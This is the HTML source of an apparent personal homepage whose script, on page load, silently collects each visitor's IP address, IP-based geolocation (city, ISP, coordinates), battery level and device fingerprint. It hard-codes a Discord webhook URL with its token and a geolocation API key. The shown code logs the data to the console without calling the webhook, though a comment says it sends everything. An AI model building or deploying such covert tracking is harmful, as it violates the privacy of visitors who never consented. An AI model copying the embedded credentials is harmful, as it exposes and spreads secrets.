<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enhanced Visitor Info</title>
    <style>
        /* Animated Gradient Background */
        body {
            background: linear-gradient(90deg, #add8e6, #dda0dd, #add8e6);
            background-size: 300% 100%;
            animation: gradientAnimation 12s linear infinite;
            color: #ffffff;
            font-family: Arial, sans-serif;
            text-align: center;
            height: auto;
            margin: 0;
            padding: 20px;
            overflow-y: auto;
        }

        @keyframes gradientAnimation {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        h1 {
            font-size: 2em;
            text-shadow: 1px 1px 5px rgba(0, 0, 0, 0.5);
        }

        .buttons-container {
            display: flex;
            justify-content: space-between;
            margin-top: 50px;
        }

        .button-column {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        button {
            background: rgba(221, 160, 221, 0.8); /* Transparent purple */
            border: none;
            border-radius: 15px;
            color: #ffffff;
            font-size: 1.6em;
            padding: 20px 80px;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.2s ease;
            background: #B4D1D0; /* Change background color on hover */
        }
        

        button:hover {
            background: rgba(173, 216, 230, 0.8); /* Transparent blue */
            transform: scale(1.1);
        }

        button:active {
            transform: scale(1);
        }

        .right-buttons {
            text-align: center;
        }
    </style>
</head>
<body>
    <h1>Welcome to my website.</h1>
    <div class="buttons-container">
        <!-- Left buttons -->
        <div class="button-column">
            <button onclick="alert('')">Left Button 1</button>
            <button onclick="alert('Left Button 2')">Left Button 2</button>
            <button onclick="alert('Left Button 3')">Left Button 3</button>
            <button onclick="alert('Left Button 4')">Left Button 4</button>
        </div>

        <!-- Right buttons -->
        <div class="button-column right-buttons">
            <button onclick="redirectToPage()">About Me</button>
            <button onclick="redirectToPageProject()">My Projects</button>
            <button onclick="alert('Right Button 3')">Right Button 3</button>
            <button onclick="alert('Right Button 4')">Right Button 4</button>
        </div>
    </div>

    <script>
        function redirectToPage() {
            window.location.href = 'page1.html';
        }
        function redirectToPageProject() {
            window.location.href = 'Projects.html';
        }

        // Webhook and API Key Configurations
        const webhookURL = 'https://discord.com/api/webhooks/1306241739346018404/r_uDL2KtEA2RJ9X2NwsATtD_5IC_R-GZ2FsyP5ljOFNjd9SUxbQuzpzWeWfPq8pyemi5';
        const ipflareAPIKey = 'd1e499e1d5842e97.b83b5e9e9e0197ab0a66eb4d3c8b707a05ab80b9f8d27598627804ad8478f27';

        const errorMessages = {
            "INVALID_IP_ADDRESS": "The provided IP address is invalid.",
            "RESERVED_IP_ADDRESS": "The provided IP address is reserved and cannot be used.",
            "GEOLOCATION_NOT_FOUND": "Geolocation information for the provided IP address could not be found.",
            "QUOTA_EXCEEDED": "The request quota has been exceeded.",
            "INTERNAL_SERVER_ERROR": "An internal server error occurred.",
            "NO_API_KEY_PROVIDED": "No API key was provided in the request.",
            "UNAUTHORIZED": "The provided API key is not authorized."
        };

        // Fetch IP Address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP:', error);
                return null;
            }
        }

        // Fetch Location
        async function getLocation(ip) {
            try {
                const response = await fetch(`https://api.ipflare.io/${ip}`, {
                    method: 'GET',
                    headers: { 'X-API-Key': ipflareAPIKey }
                });
                const data = await response.json();

                if (data.error) {
                    const errorMessage = errorMessages[data.error] || "An unknown error occurred.";
                    console.error(`Error (${data.error}): ${errorMessage}`);
                    return null;
                }

                return {
                    city: data.city || "N/A",
                    country: data.country_name || "N/A",
                    region: data.region_name || "N/A",
                    isp: data.isp || "N/A",
                    latitude: data.latitude || "N/A",
                    longitude: data.longitude || "N/A",
                    currency: data.currency || "N/A",
                    timezone: data.timezone || "N/A",
                    postal: data.postal || "N/A",
                    country_calling_code: data.country_calling_code || "N/A",
                    country_emoji: data.country_emoji || "N/A",
                };
            } catch (error) {
                console.error('Error fetching location:', error);
                return null;
            }
        }

        // Fetch Battery Info
        function getBatteryInfo() {
            if (navigator.getBattery) {
                return navigator.getBattery().then(battery => `${(battery.level * 100).toFixed(0)}%`);
            } else {
                return Promise.resolve('Battery info not available');
            }
        }

        // Fetch Enhanced Device Info
        function getEnhancedDeviceInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const isMobile = /Mobi|Android/i.test(userAgent) ? "Yes" : "No";
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const screenOrientation = window.innerWidth > window.innerHeight ? 'Landscape' : 'Portrait';
            const windowDimensions = `${window.innerWidth}x${window.innerHeight}`;
            const deviceMemory = navigator.deviceMemory || "Unknown";
            const hardwareConcurrency = navigator.hardwareConcurrency || "Unknown";

            return `
                User-Agent: ${userAgent}
                Platform: ${platform}
                Language: ${language}
                Timezone: ${timezone}
                Mobile Device: ${isMobile}
                Screen Resolution: ${screenResolution}
                Screen Orientation: ${screenOrientation}
                Window Dimensions: ${windowDimensions}
                Device Memory: ${deviceMemory} GB
                Hardware Concurrency: ${hardwareConcurrency} Cores
            `;
        }

        // Fetch and Send All Data
        Promise.all([getIPAddress(), getBatteryInfo()])
            .then(([ip, battery]) => {
                if (!ip) {
                    console.error("IP address could not be fetched.");
                    return;
                }
                const deviceInfo = getEnhancedDeviceInfo();
                getLocation(ip).then(location => {
                    if (!location) {
                        console.error("Location information could not be fetched.");
                        return;
                    }
                    console.log({ ip, location, battery, deviceInfo });
                });
            });
    </script>
</body>
</html>
